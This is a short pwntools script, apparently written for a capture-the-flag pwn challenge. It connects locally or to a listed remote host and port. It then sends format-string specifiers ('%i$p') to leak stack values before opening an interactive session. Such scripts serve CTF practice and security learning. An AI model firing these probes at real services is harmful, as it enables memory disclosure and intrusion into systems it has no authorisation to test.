#!/usr/bin/python

from pwn import *

PATH = './chall'

GDBSCRIPT = '''

'''

HOST = '103.152.242.172'
PORT = 60903

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def exploit(r):
    for i in range(0x100):
        r.sendline(f'%{i}$p')
        print(i, r.recvline(0))

    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)